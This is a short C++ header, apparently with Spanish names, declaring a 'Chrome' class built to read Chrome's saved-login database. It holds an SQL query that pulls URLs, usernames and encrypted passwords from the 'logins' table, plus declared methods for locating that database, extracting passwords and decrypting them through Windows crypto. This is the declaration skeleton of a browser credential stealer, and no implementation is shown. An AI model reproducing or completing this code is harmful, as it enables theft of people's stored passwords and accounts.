#include <iostream>
#include <Shlwapi.h>
#include <shlobj.h>
#include <windows.h>
#include <string>
#include <vector>
#include <cstdio>
#include <fstream>
#include <tchar.h>

#pragma comment(lib, "crypt32.lib")

#include <windows.h>
#include <shlobj.h>

#include <iostream>
#include <tchar.h>

#include "sqlite3.h"

# define CONSULTA		"SELECT origin_url, username_value, length(password_value), password_value FROM logins"
using namespace std;

#pragma once
class Chrome
{
public:
	Chrome();
	~Chrome();

	char* getRutaBD();
	char* getContraseñas(char* rutaBD);
	const char* descifrarPassword(BYTE* password, int size);
};